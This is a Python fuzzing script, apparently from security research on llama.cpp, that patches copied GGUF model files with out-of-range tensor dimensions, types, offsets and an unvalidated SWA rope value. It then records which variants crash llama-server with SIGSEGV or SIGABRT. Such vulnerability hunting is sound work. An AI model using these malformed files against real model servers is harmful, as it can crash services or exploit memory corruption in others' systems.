#!/usr/bin/env python3
# Tensor-info field attacks on GGUF. Frontier = hunt SIGSEGV (real memory
# corruption), not the SIGABRT assertions prior phases already saturated.
# Patches a COPY of each model's first tensor-info struct + the unvalidated
# SWA rope path, runs llama-server --check-tensors, classifies the signal.
import struct, mmap, os, sys, time, subprocess, shutil, csv, signal, socket
from pathlib import Path

MDIR = Path("logs/ultimate/models")
SERVER = "llama-monitor/build/llama.cpp/bin/llama-server"
TIMEOUT = 30
TDIR = Path("logs/tensor")
CSVFILE = TDIR / "tensor_results.csv"

MODELS = {"nemotron": MDIR/"nemotron.gguf", "gemma4": MDIR/"gemma4.gguf",
          "qwen35": MDIR/"qwen35.gguf", "phi4": MDIR/"phi4.gguf"}

# --- primitives reused verbatim from gguf-chained-attacks.py ---
def pref(k):
    if isinstance(k, str): k = k.encode()
    return struct.pack("<Q", len(k)) + k

def meta(path, key):
    with open(path, "rb") as f:
        d = f.read(50 << 20)
    p = pref(key); i = d.find(p)
    if i < 0: return None
    t = struct.unpack_from("<I", d, i + len(p))[0]
    return t, d, i + len(p) + 4

def mpatch(path, key, fmt, val):
    r = meta(path, key)
    if r is None: return False
    _, _, vo = r
    with open(path, "r+b") as f, mmap.mmap(f.fileno(), 0, access=mmap.ACCESS_WRITE) as m:
        struct.pack_into(fmt, m, vo, val)
    return True

def get_arch(path):
    r = meta(path, "general.architecture")
    if r is None: return "unknown"
    t, d, vo = r
    if t != 8: return "unknown"
    sl = struct.unpack_from("<Q", d, vo)[0]
    return d[vo+8:vo+8+sl].decode(errors="replace")

def check(path):
    # get OS-assigned free port so tests never collide
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind(('', 0)); port = s.getsockname()[1]
    # kill any leftover server on that port (shouldn't exist but be safe)
    subprocess.run(["pkill", "-f", f"llama-server.*{port}"], capture_output=True)
    time.sleep(0.3)
    cmd = [str(SERVER), "--check-tensors", "-m", str(path), "--port", str(port), "--host", "127.0.0.1"]
    t0 = time.monotonic()
    try:
        proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        while time.monotonic() - t0 < TIMEOUT:
            time.sleep(0.5)
            if proc.poll() is not None: break
        e = time.monotonic() - t0
        if proc.poll() is None:
            # server loaded OK, still running -- kill with short communicate timeout
            proc.kill(); proc.communicate(timeout=5)
            return {"rc": 0, "signal": "OK", "crashed": False, "elapsed": round(e,1), "error": "loaded_ok"}
        # process already exited -- read output with short timeout
        rc = proc.returncode
        try:
            _, stderr = proc.communicate(timeout=5)
        except subprocess.TimeoutExpired:
            stderr = ""
        s = rc - 256 if rc > 128 else rc
        sn = signal.Signals(-s).name if s < 0 else f"exit({rc})"
        err = [l for l in stderr.split("\n") if any(w in l.lower() for w in ("error","assert","segv","segfault","sigabrt"))]
        return {"rc": rc, "signal": sn, "crashed": s < 0, "elapsed": round(e,1),
                "error": ("; ".join(err)[:250] if err else stderr[-120:].strip()[:120])}
    except Exception as ex:
        return {"rc": -999, "signal": "ERR", "crashed": False, "elapsed": 0, "error": str(ex)[:120]}

# --- GGUF structural parse: walk header+KV section to locate first tensor info ---
_VSZ = {0:1,1:1,2:2,3:2,4:4,5:4,6:4,7:1,10:8,11:8,12:8}  # fixed-size value types

def _skip_str(d, o): n = struct.unpack_from("<Q", d, o)[0]; return o + 8 + n
def _skip_val(d, o, t):
    if t in _VSZ: return o + _VSZ[t]
    if t == 8: return _skip_str(d, o)                       # STRING
    if t == 9:                                              # ARRAY
        et = struct.unpack_from("<I", d, o)[0]; cnt = struct.unpack_from("<Q", d, o+4)[0]; o += 12
        for _ in range(cnt):
            o = (o + _VSZ[et]) if et in _VSZ else _skip_str(d, o)
        return o
    raise ValueError(f"bad value type {t}")

def tensor0(path):
    """Return byte offsets of the first tensor-info's fields: n_dims, dim0, type, offset."""
    with open(path, "rb") as f:
        d = f.read(50 << 20)
    assert d[:4] == b"GGUF", "not a GGUF file"
    tc = struct.unpack_from("<Q", d, 8)[0]; kc = struct.unpack_from("<Q", d, 16)[0]
    o = 24
    for _ in range(kc):                                     # skip metadata KV
        o = _skip_str(d, o)                                 # key
        vt = struct.unpack_from("<I", d, o)[0]; o += 4
        o = _skip_val(d, o, vt)
    # first tensor info: name(str), n_dims(u32), dims[n_dims](u64), type(u32), offset(u64)
    assert tc >= 1, "no tensors"
    o = _skip_str(d, o)                                     # tensor name
    nd_off = o; nd = struct.unpack_from("<I", d, o)[0]; o += 4
    dim0_off = o; o += 8 * nd
    type_off = o; o += 4
    off_off = o
    return {"n_dims": nd_off, "dim0": dim0_off, "type": type_off, "offset": off_off,
            "n_dims_val": nd}, d

# --- attacks: each takes (copy_path, arch) and patches one tensor field ---
def a_ndims_huge(vp, arch):
    o, _ = tensor0(vp)
    with open(vp,"r+b") as f, mmap.mmap(f.fileno(),0,access=mmap.ACCESS_WRITE) as m:
        struct.pack_into("<I", m, o["n_dims"], 0x7FFFFFFF)
    return {"n_dims":"0x7FFFFFFF"}
def a_ndims_zero(vp, arch):
    o, _ = tensor0(vp)
    with open(vp,"r+b") as f, mmap.mmap(f.fileno(),0,access=mmap.ACCESS_WRITE) as m:
        struct.pack_into("<I", m, o["n_dims"], 0)
    return {"n_dims":"0"}
def a_dim_huge(vp, arch):
    o, _ = tensor0(vp)
    with open(vp,"r+b") as f, mmap.mmap(f.fileno(),0,access=mmap.ACCESS_WRITE) as m:
        struct.pack_into("<Q", m, o["dim0"], 0x7FFFFFFFFFFFFFFF)
    return {"dim0":"0x7FFFFFFFFFFFFFFF"}
def a_dim_zero(vp, arch):
    o, _ = tensor0(vp)
    with open(vp,"r+b") as f, mmap.mmap(f.fileno(),0,access=mmap.ACCESS_WRITE) as m:
        struct.pack_into("<Q", m, o["dim0"], 0)
    return {"dim0":"0"}
def a_type_oob(vp, arch):
    o, _ = tensor0(vp)
    with open(vp,"r+b") as f, mmap.mmap(f.fileno(),0,access=mmap.ACCESS_WRITE) as m:
        struct.pack_into("<I", m, o["type"], 0x7FFFFFFF)   # ggml_type enum out of range
    return {"type":"0x7FFFFFFF"}
def a_offset_eof(vp, arch):
    o, _ = tensor0(vp)
    fsz = os.path.getsize(vp)
    with open(vp,"r+b") as f, mmap.mmap(f.fileno(),0,access=mmap.ACCESS_WRITE) as m:
        struct.pack_into("<Q", m, o["offset"], fsz + (1<<30))  # past EOF
    return {"offset": f"eof+1G ({fsz})"}
def a_offset_huge(vp, arch):
    o, _ = tensor0(vp)
    with open(vp,"r+b") as f, mmap.mmap(f.fileno(),0,access=mmap.ACCESS_WRITE) as m:
        struct.pack_into("<Q", m, o["offset"], 0x7FFFFFFFFFFFFFFF)
    return {"offset":"0x7FFFFFFFFFFFFFFF"}
def a_swa_rope(vp, arch):
    ok = mpatch(vp, f"{arch}.rope.dimension_count_swa", "<I", 0x7FFFFFFF)
    return {"swa_dim":"0x7FFFFFFF" if ok else "KEY_ABSENT"}

ATTACKS = [
    ("ndims_huge", a_ndims_huge, "tensor n_dims = INT32_MAX"),
    ("ndims_zero", a_ndims_zero, "tensor n_dims = 0"),
    ("dim_huge",   a_dim_huge,   "tensor dim0 = INT64_MAX"),
    ("dim_zero",   a_dim_zero,   "tensor dim0 = 0"),
    ("type_oob",   a_type_oob,   "ggml_type enum out of range (type confusion)"),
    ("offset_eof", a_offset_eof, "tensor data offset just past EOF"),
    ("offset_huge",a_offset_huge,"tensor data offset = INT64_MAX"),
    ("swa_rope",   a_swa_rope,   "unvalidated rope.dimension_count_swa = INT32_MAX"),
]

def main():
    import argparse
    ap = argparse.ArgumentParser()
    ap.add_argument("--models", nargs="+", default=list(MODELS.keys()))
    ap.add_argument("--selftest", action="store_true")
    args = ap.parse_args()
    if args.selftest:
        for mn, mp in MODELS.items():
            if not mp.exists(): continue
            o, d = tensor0(str(mp)); fsz = mp.stat().st_size
            assert 24 < o["n_dims"] < fsz and o["n_dims_val"] < 8, (mn, o)
            t = struct.unpack_from("<I", d, o["type"])[0]
            assert t < 40, (mn, "type", t)   # real ggml_type is a small enum
            print(f"[selftest] {mn}: tensor0 fields {o} type={t} OK")
        print("selftest PASS"); return

    TDIR.mkdir(parents=True, exist_ok=True)
    fields = ["model","arch","attack","desc","signal","crashed","elapsed","details","error"]
    with open(CSVFILE,"w",newline="") as f: csv.DictWriter(f, fieldnames=fields).writeheader()

    for mn in args.models:
        mp = MODELS.get(mn)
        if not mp or not mp.exists(): print(f"[SKIP] {mn}", file=sys.stderr); continue
        arch = get_arch(str(mp))
        print(f"\n{'='*60}\n  {mn} arch={arch}\n{'='*60}", flush=True)
        for aname, afn, adesc in ATTACKS:
            vp = TDIR / f"{mn}_{aname}.gguf"
            shutil.copy2(str(mp), str(vp))          # fresh copy per attack
            try:
                det = afn(str(vp), arch)
            except Exception as ex:
                det = {"GENERR": str(ex)[:80]}; res = {"signal":"PATCHERR","crashed":False,"elapsed":0,"error":str(ex)[:120]}
            else:
                res = check(str(vp))
            row = {"model":mn,"arch":arch,"attack":aname,"desc":adesc,
                   "signal":res["signal"],"crashed":res["crashed"],"elapsed":res["elapsed"],
                   "details":str(det),"error":res["error"]}
            with open(CSVFILE,"a",newline="") as f: csv.DictWriter(f, fieldnames=fields).writerow(row)
            flag = " <<< SIGSEGV" if res["signal"]=="SIGSEGV" else ""
            print(f"  [{aname:12s}] {res['signal']:10s} {res['elapsed']}s {det}{flag}", flush=True)
            try: vp.unlink()                        # free disk before next copy
            except OSError: pass

if __name__ == "__main__":
    main()
